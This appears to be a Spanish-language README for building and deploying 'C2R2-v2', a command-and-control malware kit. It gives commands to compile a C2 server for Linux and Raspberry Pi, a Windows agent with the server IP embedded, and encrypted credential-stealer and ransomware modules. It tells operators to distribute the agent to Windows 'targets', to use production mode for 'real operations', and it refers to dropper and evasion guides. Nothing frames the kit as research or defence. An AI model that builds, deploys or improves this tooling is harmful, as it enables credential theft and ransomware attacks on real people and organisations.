# 🏗️ Docker Build System - C2R2-v2

Sistema de compilación automática que genera todos los binarios necesarios para C2R2-v2.

## 📦 Binarios Generados

### Servidor C2R2
- **`c2r2-server`** - Servidor x86_64 (Linux, Ubuntu, Debian, etc.)
- **`c2r2-server-arm64`** - Servidor ARM64 (Raspberry Pi 3/4/5, 400, Zero 2 W)

### Agente Windows
- **`agent.exe`** (o nombre personalizado) - Agente compilado con configuración específica

### Herramientas
- **`builder`** - Utilidad para encriptar módulos y construir agentes
- **`stealer.dll`** - Módulo de robo de credenciales (encriptado)
- **`ransomware.dll`** - Módulo de ransomware (encriptado)

---

## 🚀 Uso Rápido

### Opción 1: Script Automatizado (Recomendado)

```bash
# Desde WSL/Linux
cd /mnt/e/repos/C2R2-v2

# Compilar todo con configuración personalizada
bash docker-build.sh --ip 181.231.253.69 --port 4444 --production --no-cache
```

**Parámetros:**
- `--ip IP` - IP del servidor C2 (default: 127.0.0.1)
- `--port PORT` - Puerto del servidor C2 (default: 4444)
- `--name NAME` - Nombre del agente (default: agent)
- `--production` - Modo producción (sin consola, sin debug)
- `--no-cache` - Forzar rebuild completo (recomendado tras cambios)

### Opción 2: Docker Directo

```bash
# Build manual
docker build --no-cache -t c2r2-builder .

# Extraer binarios
docker run --rm -v $(pwd)/dist:/output c2r2-builder
```

---

## 🎯 Uso de los Binarios

### Servidor en Linux x86_64 (Ubuntu, Debian, etc.)

```bash
cd dist
./c2r2-server --bind 0.0.0.0 --port 4444
```

### Servidor en Raspberry Pi

```bash
# Transferir a Raspberry Pi
scp dist/c2r2-server-arm64 pi@192.168.1.100:/home/pi/

# En la Raspberry Pi
chmod +x c2r2-server-arm64
./c2r2-server-arm64 --bind 0.0.0.0 --port 4444
```

**Compatibilidad Raspberry Pi:**
- ✅ Raspberry Pi 5 (ARM Cortex-A76)
- ✅ Raspberry Pi 4 (ARM Cortex-A72)
- ✅ Raspberry Pi 3 B/B+ (ARM Cortex-A53)
- ✅ Raspberry Pi 400 (ARM Cortex-A72)
- ✅ Raspberry Pi Zero 2 W (ARM Cortex-A53)
- ❌ Raspberry Pi Zero/Zero W (ARMv6 - no soportado)

### Agente en Windows

```bash
# Transferir a máquina Windows objetivo
# El agente ya está configurado con IP:PORT correctos
agent.exe
```

---

## 🔧 Arquitecturas Soportadas

| Componente | x86_64 | ARM64 | Windows |
|------------|--------|-------|---------|
| Servidor C2 | ✅ | ✅ | ❌ |
| Agente | ❌ | ❌ | ✅ |
| Builder | ✅ | ❌ | ❌ |
| DLLs | ❌ | ❌ | ✅ |

---

## 📋 Ejemplos de Uso

### Escenario 1: Raspberry Pi como C2 Server

```bash
# 1. Compilar con IP pública de tu Raspberry Pi
bash docker-build.sh --ip 203.0.113.50 --port 4444 --production

# 2. Transferir servidor ARM a Raspberry Pi
scp dist/c2r2-server-arm64 pi@203.0.113.50:/home/pi/c2r2

# 3. En la Raspberry Pi, iniciar servidor
ssh pi@203.0.113.50
cd /home/pi
./c2r2 --bind 0.0.0.0 --port 4444

# 4. Distribuir agent.exe a objetivos Windows
# El agente se conectará automáticamente a 203.0.113.50:4444
```

### Escenario 2: VPS Linux como C2 Server

```bash
# 1. Compilar con IP del VPS
bash docker-build.sh --ip 45.67.89.10 --port 443 --production

# 2. Transferir servidor x86_64 al VPS
scp dist/c2r2-server root@45.67.89.10:/root/c2r2

# 3. En el VPS
ssh root@45.67.89.10
./c2r2 --bind 0.0.0.0 --port 443
```

### Escenario 3: Testing Local

```bash
# Compilar en modo desarrollo
bash docker-build.sh --ip 127.0.0.1 --port 4444

# Iniciar servidor
cd dist
./c2r2-server

# Probar agente en VM Windows
# (agente tendrá debug habilitado)
```

---

## 🛠️ Troubleshooting

### Error: "edition 2024 not supported"

**Problema:** Caché antiguo de Docker con Rust 1.70

**Solución:**
```bash
docker builder prune -f
docker build --no-cache -t c2r2-builder .
```

### Error: "cannot stat target/...release/c2r2-server"

**Problema:** Ruta incorrecta al compilar

**Solución:** Ya está corregido en la última versión. Usar `--no-cache`.

### Servidor ARM no ejecuta en Raspberry Pi

**Problema:** Raspberry Pi Zero/Zero W usa ARMv6 (no soportado)

**Solución:** Usar Raspberry Pi 3+ que tiene ARMv8 (ARM64)

Verificar arquitectura:
```bash
uname -m
# Debe mostrar: aarch64 (ARM64)
# Si muestra: armv6l o armv7l → No compatible
```

---

## 📊 Tamaños Aproximados

| Binario | Tamaño | Observaciones |
|---------|--------|---------------|
| c2r2-server (x86_64) | ~8 MB | Servidor Linux |
| c2r2-server-arm64 | ~8 MB | Servidor Raspberry Pi |
| agent.exe | ~600 KB | Agente Windows (producción) |
| builder | ~4 MB | Herramienta de build |
| *.dll | ~500 KB | Módulos encriptados |

---

## 🔐 Notas de Seguridad

1. **Los binarios generados contienen:**
   - IP y puerto del servidor C2 embebidos
   - Claves de encriptación para módulos
   - En modo producción: sin símbolos de debug

2. **Recomendaciones:**
   - Usar `--production` para operaciones reales
   - Cambiar claves de encriptación en `builder/src/encrypt.rs`
   - Ejecutar servidor C2 detrás de proxy reverso (Nginx)
   - Usar HTTPS/TLS para tráfico C2

3. **Raspberry Pi como C2:**
   - Ventajas: Bajo consumo, portátil, discreto
   - Desventajas: CPU limitada (recomendado para <50 agentes)
   - Recomendación: Raspberry Pi 4 con 4GB+ RAM

---

## 📚 Más Información

- **Dropper System**: Ver `dropper/QUICKSTART.md`
- **Iconos y Evasión**: Ver `dropper/ICON_USAGE_GUIDE.md`
- **Docker Build Script**: Ver `docker-build.sh --help`

---

**¿Listo para compilar?**

```bash
cd /mnt/e/repos/C2R2-v2
bash docker-build.sh --ip TU_IP --port TU_PUERTO --production --no-cache
```

🎯 **Resultado**: Binarios listos en `dist/` para Linux (x86_64 y ARM64) y Windows
